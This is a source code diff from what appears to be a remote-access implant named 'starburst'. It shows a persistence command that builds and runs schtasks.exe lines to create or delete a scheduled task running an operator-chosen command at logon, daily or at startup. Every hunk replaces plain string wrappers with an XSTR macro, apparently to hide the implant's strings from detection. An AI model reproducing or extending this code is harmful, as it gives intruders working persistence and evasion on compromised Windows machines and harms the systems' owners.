@@ -58,7 +58,7 @@ static auto WINAPI declfn schtask_thread_fn( LPVOID param ) -> DWORD {
         inst.heap_free( output );
     } else {
         queue_response( inst, ctx->task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "" ) ) );
+            XSTR( "" ) );
     }
 
     inst.heap_free( ctx );
@@ -81,7 +81,7 @@ auto declfn starburst::cmd_persist_schtask(
 
     if ( !action_str || action_len == 0 || !name_str || name_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "need action and name" ) ) );
+            XSTR( "need action and name" ) );
         return;
     }
 
@@ -97,7 +97,7 @@ auto declfn starburst::cmd_persist_schtask(
         memory::copy( trigger_buf, trigger_str, trigger_len < 15 ? trigger_len : 15 );
 
     bool is_install = str_cmp( action_buf,
-        symbol<char*>( const_cast<char*>( "install" ) ) ) == 0;
+        XSTR( "install" ) ) == 0;
 
     // Build command line for schtasks.exe
     char cmdline[2048] = { 0 };
@@ -105,49 +105,47 @@ auto declfn starburst::cmd_persist_schtask(
     if ( is_install ) {
         if ( !command_str || command_len == 0 || !trigger_str || trigger_len == 0 ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "install requires command and trigger" ) ) );
+                XSTR( "install requires command and trigger" ) );
             return;
         }
 
         // Map trigger string to schtasks /SC value
         char sc_val[16] = { 0 };
-        if ( str_cmp( trigger_buf, symbol<char*>( const_cast<char*>( "logon" ) ) ) == 0 ) {
-            str_copy( sc_val, symbol<char*>( const_cast<char*>( "ONLOGON" ) ) );
-        } else if ( str_cmp( trigger_buf, symbol<char*>( const_cast<char*>( "daily" ) ) ) == 0 ) {
-            str_copy( sc_val, symbol<char*>( const_cast<char*>( "DAILY" ) ) );
-        } else if ( str_cmp( trigger_buf, symbol<char*>( const_cast<char*>( "startup" ) ) ) == 0 ) {
-            str_copy( sc_val, symbol<char*>( const_cast<char*>( "ONSTART" ) ) );
+        if ( str_cmp( trigger_buf, XSTR( "logon" ) ) == 0 ) {
+            str_copy( sc_val, XSTR( "ONLOGON" ) );
+        } else if ( str_cmp( trigger_buf, XSTR( "daily" ) ) == 0 ) {
+            str_copy( sc_val, XSTR( "DAILY" ) );
+        } else if ( str_cmp( trigger_buf, XSTR( "startup" ) ) == 0 ) {
+            str_copy( sc_val, XSTR( "ONSTART" ) );
         } else {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "invalid trigger: use logon, daily, or startup" ) ) );
+                XSTR( "invalid trigger: use logon, daily, or startup" ) );
             return;
         }
 
         // schtasks.exe /Create /TN "<name>" /TR "<command>" /SC <trigger> /F
         uint32_t off = 0;
-        str_copy( cmdline + off, symbol<char*>( const_cast<char*>(
-            "schtasks.exe /Create /TN \"" ) ) );
+        str_copy( cmdline + off, XSTR("schtasks.exe /Create /TN \"") );
         off = str_len( cmdline );
         memory::copy( cmdline + off, name_buf, str_len( name_buf ) );
         off += str_len( name_buf );
-        str_copy( cmdline + off, symbol<char*>( const_cast<char*>( "\" /TR \"" ) ) );
+        str_copy( cmdline + off, XSTR( "\" /TR \"" ) );
         off = str_len( cmdline );
         memory::copy( cmdline + off, command_buf, str_len( command_buf ) );
         off += str_len( command_buf );
-        str_copy( cmdline + off, symbol<char*>( const_cast<char*>( "\" /SC " ) ) );
+        str_copy( cmdline + off, XSTR( "\" /SC " ) );
         off = str_len( cmdline );
         memory::copy( cmdline + off, sc_val, str_len( sc_val ) );
         off += str_len( sc_val );
-        str_copy( cmdline + off, symbol<char*>( const_cast<char*>( " /F" ) ) );
+        str_copy( cmdline + off, XSTR( " /F" ) );
     } else {
         // schtasks.exe /Delete /TN "<name>" /F
         uint32_t off = 0;
-        str_copy( cmdline + off, symbol<char*>( const_cast<char*>(
-            "schtasks.exe /Delete /TN \"" ) ) );
+        str_copy( cmdline + off, XSTR("schtasks.exe /Delete /TN \"") );
         off = str_len( cmdline );
         memory::copy( cmdline + off, name_buf, str_len( name_buf ) );
         off += str_len( name_buf );
-        str_copy( cmdline + off, symbol<char*>( const_cast<char*>( "\" /F" ) ) );
+        str_copy( cmdline + off, XSTR( "\" /F" ) );
     }
 
     // Convert to wide for CreateProcessW
@@ -163,7 +161,7 @@ auto declfn starburst::cmd_persist_schtask(
 
     if ( !inst.kernel32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreatePipe failed" ) ) );
+            XSTR( "CreatePipe failed" ) );
         return;
     }
 
@@ -190,7 +188,7 @@ auto declfn starburst::cmd_persist_schtask(
     if ( !ok ) {
         inst.kernel32.CloseHandle( h_read );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateProcessW failed" ) ) );
+            XSTR( "CreateProcessW failed" ) );
         return;
     }
 
@@ -202,7 +200,7 @@ auto declfn starburst::cmd_persist_schtask(
         inst.kernel32.CloseHandle( pi.hProcess );
         inst.kernel32.CloseHandle( h_read );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -223,7 +221,7 @@ auto declfn starburst::cmd_persist_schtask(
         inst.kernel32.CloseHandle( h_read );
         inst.heap_free( ctx );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateThread failed" ) ) );
+            XSTR( "CreateThread failed" ) );
         return;
     }
 
